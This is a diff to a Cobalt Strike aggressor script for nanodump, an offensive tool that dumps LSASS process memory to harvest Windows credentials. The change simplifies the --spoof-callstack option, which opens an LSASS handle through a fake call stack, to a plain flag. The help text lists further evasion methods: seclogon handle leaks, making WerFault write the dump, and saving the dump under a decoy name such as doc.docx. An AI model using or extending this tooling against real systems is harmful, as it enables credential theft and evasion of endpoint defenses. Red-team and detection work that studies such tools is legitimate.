@@ -41,7 +41,7 @@ local('$string $c');
 beacon_command_register(
 "nanodump",
 "Use syscalls to dump LSASS.",
-"usage: nanodump [--write C:\Windows\Temp\doc.docx] [--valid] [--duplicate] [--elevate-handle] [--duplicate-elevate] [--seclogon-leak-local] [--seclogon-leak-remote C:\Windows\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--silent-process-exit C:\Windows\Temp] [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]\
+"usage: nanodump [--write C:\Windows\Temp\doc.docx] [--valid] [--duplicate] [--elevate-handle] [--duplicate-elevate] [--seclogon-leak-local] [--seclogon-leak-remote C:\Windows\notepad.exe] [--seclogon-duplicate] [--spoof-callstack] [--silent-process-exit C:\Windows\Temp] [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]\
 Dumpfile options:\
     --write DUMP_PATH, -w DUMP_PATH\
             filename of the dump\
@@ -58,7 +58,7 @@ Obtain an LSASS handle via:\
             leak an LSASS handle into another process via seclogon and duplicate it\
     --seclogon-duplicate, -sd\
             make seclogon open a handle to LSASS and duplicate it\
-    --spoof-callstack {svchost,wmi,rpc}, -sc {svchost,wmi,rpc}\
+    --spoof-callstack, -sc\
             open a handle to LSASS using a fake calling stack\
 Let WerFault.exe (instead of nanodump) create the dump\
     --silent-process-exit DUMP_FOLDER, -spe DUMP_FOLDER\
@@ -258,34 +258,7 @@ alias nanodump {
         }
         else if (@_[$i] eq "--spoof-callstack" || @_[$i] eq "-sc")
         {
-            if ($barch eq "x86")
-            {
-                berror($1, "The --spoof-callstack feature is only x64");
-                return;
-            }
-            $i++;
-            if($i >= size(@_))
-            {
-                berror($1, "missing --spoof-callstack value");
-                return;
-            }
-            if (@_[$i] eq "svchost")
-            {
-                $spoof_callstack = 1;
-            }
-            else if (@_[$i] eq "wmi")
-            {
-                $spoof_callstack = 2;
-            }
-            else if (@_[$i] eq "rpc")
-            {
-                $spoof_callstack = 3;
-            }
-            else
-            {
-                berror($1, "invalid --spoof-callstack value");
-                return;
-            }
+            $spoof_callstack = 1;
         }
         else if (@_[$i] eq "--help" || @_[$i] eq "-h")
         {
